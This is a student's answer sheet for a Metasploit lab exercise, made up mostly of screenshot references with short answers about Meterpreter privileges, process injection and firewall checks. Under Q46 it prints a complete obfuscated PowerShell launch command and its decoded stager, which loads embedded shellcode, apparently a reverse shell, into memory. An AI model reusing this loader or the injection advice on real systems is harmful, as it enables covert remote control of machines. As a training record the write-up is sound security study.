# ICC Security - Exercise 01 - Metasploit

Log all commands entered using script command:

Initialise msfdb and start using command: `msfdb init` and `msfdb start`.

## Q1

![](images/2020-06-30-09-45-08.png)

## Q2

![](images/2020-06-30-09-48-38.png)

## Q3

![](images/2020-06-30-09-50-09.png)

![](images/2020-06-30-09-56-11.png)

## Q4

![](images/2020-06-30-09-52-56.png)

## Q5

![](images/2020-06-30-09-53-22.png)

## Q6

![](images/2020-06-30-09-53-54.png)

## Q7

![](images/2020-06-30-09-57-47.png)

## Q8

![](images/2020-06-30-09-59-27.png)

## Q9

![](images/2020-06-30-10-00-34.png)

## Q10

![](images/2020-06-30-10-01-07.png)

## Q11

![](images/2020-06-30-10-02-29.png)

## Q12

![](images/2020-06-30-10-03-46.png)

## Q13

![](images/2020-06-30-10-05-34.png)

## Q14

![](images/2020-06-30-10-06-26.png)

## Q15

![](images/2020-06-30-10-09-12.png)

## Q16

Determine difference between system boot time (from "systeminfo" command output) and current system time.

![](images/2020-06-30-10-16-43.png)

## Q17

![](images/2020-06-30-10-18-55.png)

![](images/2020-06-30-10-19-11.png)

## Q18

![](images/2020-06-30-10-19-31.png)

## Q19

![](images/2020-06-30-10-19-47.png)

## Q20

![](images/2020-06-30-10-20-28.png)

## Q21

Yes - "systeminfo" output indicates that a hypervisor has been detected, indicating the target machine is running as a VM.

## Q22

![](images/2020-06-30-10-22-06.png)

![](images/2020-06-30-10-22-17.png)

![](images/2020-06-30-10-22-32.png)

## Q23

![](images/2020-06-30-10-23-34.png)

## Q24

![](images/2020-06-30-10-24-20.png)

## Q25

Process hosting the Meterpreter shell is running as local SYSTEM, so has full control over the target machine.

## Q26

No - powershell.exe is not a safe process to be injected into. Command shells are not typically left open the entire time a system is running, so may be closed regularly. It would be better for the Meterpreter shell to be injected into a process that is typically not terminated whilst the system is running (e.g. explorer.exe).

## Q27

No - cannot see any sign of security products or malware running in the process list.

## Q28

![](images/2020-06-30-10-32-21.png)

![](images/2020-06-30-10-32-35.png)

![](images/2020-06-30-10-32-53.png)

![](images/2020-06-30-10-33-10.png)

## Q29

![](images/2020-06-30-10-39-08.png)

## Q30

![](images/2020-06-30-10-41-21.png)

## Q31

![](images/2020-06-30-10-45-20.png)

![](images/2020-06-30-10-45-37.png)

## Q32

Ref Q31 screenshots.

10.10.1.1

## Q33

![](images/2020-06-30-10-46-57.png)

## Q34

Yes - firewall is running on target machine.

![](images/2020-06-30-10-48-49.png)

![](images/2020-06-30-10-49-04.png)

![](images/2020-06-30-10-49-19.png)

![](images/2020-06-30-10-49-31.png)

## Q35

Yes - from Meterpreter session, use command: `run countermeasure`.

## Q36

`run multicommand -cl "netsh advfirewall show allprofiles`

## Q37

![](images/2020-06-30-11-13-26.png)

## Q38

ANSWER: Danger 5

## Q39

![](images/2020-06-30-11-17-36.png)

![](images/2020-06-30-11-17-57.png)

## Q40-43

![](images/2020-06-30-11-20-32.png)

## Q44

![](images/2020-06-30-11-28-39.png)

---

+++

---

## Q46

Command line string for process 3588 (used to host Meterpreter shell) was:

```
"powershell.exe" -noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAKt/+l4CA7VWbW+bSBD+nEr9D6iyZFAcg1M3l4tU6RaMbVyTmGDjt1onAmvYeFlcWGKTXv/7DRinqZretScdQmJ3dl6fmdlhnTGPk5gJ5K7XEj6/fnUychM3EsTaQ8xIQ6h92vvSyQnQa+tr5UZ4L4hLtN124sglbHV1pWVJghk/7Js9zFGa4uiOEpyKkvCXMA1xgs9u7u6xx4XPQu3PZo/Gdy6t2HLN9UIsnCHmF2fD2HMLb5r2lhIu1j9+rEvLs9aqqX/KXJqKdTtPOY6aPqV1SfgiFQbH+RaLdZN4SZzGa96cEvb2vDlhqbvG16DtAZuYh7Gf1iWIAt4E8yxhQhlPoeBwLNZhOUpiD/l+glPgbhrsId5gscYyShvCH+Kysn6bMU4iDOccJ/HWxskD8XDa7LvMp/gWr1fiNd4dg/5ZIfG5EHCNeCI1IA8vuGnGfkbxQbIufe9omTsJnip/EPiX169ev1ofk+1OO/R5smF1sizXGLwTR3FKSr73gtIQTLDj8jjJYVsbJxmWVsKyQH25WgGKlt/4sXjryAucm+QeKEsnJv4KJKps1HZ2Qf1xTXXwmjDcyZkbEe9YNuJLCOM1xWV8zSPbNXgk1qsD7HcwxYHLC8wawvJ7MT0i/ElWzQj1cYI8yFIKXkECpW+dOaRBrBvMxBHgc9jXAfQ1FCs+clcFmh+tF3tgqmvUTdOGMMqgW7yGYGOXYr8hIJaS6ghlPC6X9a/umhnlxHNTflS3kg4oVta0mKU8yTxIGEQ+trfYIy4tgGgIfeJjNbdJcLRafxEGzaWUsAA0PUAagFKEb/OiDBK/UaZcatqYG9GW4ghYyp7tUjeADq3qvCwbN8B+/Vv3jlV8KNkChmP8z5yD3No05g3BIQmHxi8gher5T6afNTw4oSW4yoB4bIqlmvOilGsP+7fKqKjFCpEy/oRD7N0kjlQ3xRdtmyeAjPhG1knn3agTPyJ49O6t5aj2xFkYpj+gtsHtuU6GkzA0SMsIYJ9P9GDEle2H8bg/sDt9lHT24RoZqaH31dxqqcjrk9+cgTqZgBzRhtb93kC+GgWzYK7tjFE4M8CQNgyMAL6qEXqqslACVelqQ1sNdaKgwLb6Vru1MORLqpJH27BRf/pk78mO3m73Z/sxujYHKOze+N3WebeU3xTyi01v2NHLvVfsrXmqEx3s6N255YR46mzVqd5dWM7WCE53geUM5XY3VIFukP1wa8vwtFqDB+Y/mvTy0QR3LWcxIHhhBDgPkIWQPWfUvttpSO16WhCrI707AdpmbLC9dbc1/Xzel393TIK3MbJ0hLoUejFC7q4jt6bxB8t5Z010ZZ9PlP1Ov5d3OhnsNtV30ru4COR1eyQ7tsH6bqiCv/mgvSGDUziLXEeZr2WnwE/bMPmRzejFwCwxhXgskCEFZm5wC3IHGcSZMZNlJ5ADtKaOEVxawSxm5+4GdE8DBB5CjJDr9cAwPfCVks3kdCa3JuCPEg32SuFrNLgEfeebF3TaIWDrL1ykFn6o016MppvehZZfjkyIw2mBTuZk42kfdILP2eaygBny27E11rON2bl/d6vKp/7cDdRFdor8D8FWJX4it6z3798UbQB9UMvbybtn9f2jiWS6SRq6FOoeRs3xlunGSbeaHqOYFBKiWP4ybHDCMIWJCzP52K+I0tgrhlc5Z2BwHsbZCm6bCSzfnr+4koQnRunrUDuSrq4W4CVcAWWbNoeYBTxsKLBRYEYp+7YCYf58aFq8zcWDrkYx5EpwnrTTUrtUXA+19Ob/xay6kkL4+P+G2VfaP5z+FI5K4xDxd+RvCb+E6S+HPnUJB04brlSKD8P8ZQSqAnn2q5PeQO7X1VP8aN5k/Owa/n/+BpGSz5nRCgAA'))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

Base64-encoded string was compressed using gzip. Decode from base64 then decompress from gzip to get following script:

```
function ibG1 {
	Param ($voni, $qxd)		
	$fN0O = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $fN0O.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($fN0O.GetMethod('GetModuleHandle')).Invoke($null, @($voni)))), $qxd))
}

function aWDl {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $fQd,
		[Parameter(Position = 1)] [Type] $krj = [Void]
	)
	
	$wS = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$wS.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $fQd).SetImplementationFlags('Runtime, Managed')
	$wS.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $krj, $fQd).SetImplementationFlags('Runtime, Managed')
	
	return $wS.CreateType()
}

[Byte[]]$vx30P = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcCgoBPEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZu+AdKgpBidr/1Q==")
		
$y4r5 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ibG1 kernel32.dll VirtualAlloc), (aWDl @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $vx30P.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($vx30P, 0, $y4r5, $vx30P.length)

$sO = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ibG1 kernel32.dll CreateThread), (aWDl @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$y4r5,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ibG1 kernel32.dll WaitForSingleObject), (aWDl @([IntPtr], [Int32]))).Invoke($sO,0xffffffff) | Out-Null
```

## Q49

ANSWER:
- The first event in the command output (most recent event) at time "29/06/2020 06:40:40" was created when we terminated the Meterpreter session, resulting in the SYSTEM user logon session being terminated.

```
Security log on \\AD:
[138976] Microsoft-Windows-Security-Auditing
   Type:     SUCCESS AUDIT 
   Computer: AD.iccex.com
   Time:     29/06/2020 06:40:40 م   ID:       4634 
An account was logged off.

  Subject:

	Security ID:		S-1-5-18

	Account Name:		AD$

	Account Domain:		ICCEX

	Logon ID:		0xd7c9c

  Logon Type:			3

  This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
```
